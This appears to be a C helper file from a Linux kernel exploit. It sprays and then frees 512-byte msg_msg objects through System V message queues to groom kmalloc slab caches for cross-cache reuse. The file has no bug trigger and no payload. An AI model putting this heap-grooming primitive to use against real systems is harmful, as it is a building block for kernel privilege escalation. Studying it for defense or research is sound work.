#include "msg_spray.h"
#include <sys/ipc.h>
#include <sys/msg.h>
#include <string.h>

// msg_msg objects live in kmalloc caches → used for cross-cache interaction
struct msg {
    long mtype;
    char mtext[512];  // size chosen to hit a predictable kmalloc-* cache
};

int spray_msgs(int n)
{
    // creates kernel queue → forces slab allocations in msg_msg cache
    int q = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

    struct msg m;
    m.mtype = 1;
    memset(m.mtext, 'A', sizeof(m.mtext));

    // repeated allocation → fills slab pages
    for (int i = 0; i < n; i++)
        msgsnd(q, &m, sizeof(m.mtext), 0);

    return q;
}

void free_msgs(int q, int n){

  struct msg m;

  // freeing returns objects -> underlying pages become candidates for reuse.
  for (int i = 0; i < n; i++){
    msgrcv(q, &m, sizeof(m.mtext), 0, 0);
  }
}
